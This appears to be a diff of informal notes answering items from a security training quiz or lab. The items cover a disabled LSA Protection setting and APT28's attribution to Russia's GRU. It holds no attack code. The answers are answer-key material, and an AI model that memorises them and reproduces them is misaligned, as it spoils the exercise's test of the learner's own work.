+/// the response is LSA Protection // it was diseable LSA;Local Security Authority
+
+2.15
+
+
+Both of these threat actor groups are part of which specific agency from their country of origin?
+
+both threat actor group belong are
+
+APT28
+
+APT28 → GRU (Russian Military Intelligence), Russia
+
+/// the response is GRU
+
+The ende
+
+
+
